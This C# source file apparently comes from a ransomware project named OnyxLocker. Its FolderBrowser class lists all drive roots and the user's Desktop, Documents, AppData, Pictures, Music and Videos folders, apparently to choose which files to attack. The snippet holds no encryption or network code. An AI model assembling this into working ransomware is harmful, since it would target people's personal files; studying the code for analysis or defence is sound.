using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace OnyxLocker.Classes;

internal class FolderBrowser : IDriveExplorer
{
	public List<string> GetStartingFolders()
	{
		List<string> list = (from drive in DriveInfo.GetDrives()
			select drive.Name).ToList();
		list.AddRange(GetSpecialFolders());
		return list;
	}

	private List<string> GetSpecialFolders()
	{
		return new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)
		};
	}
}
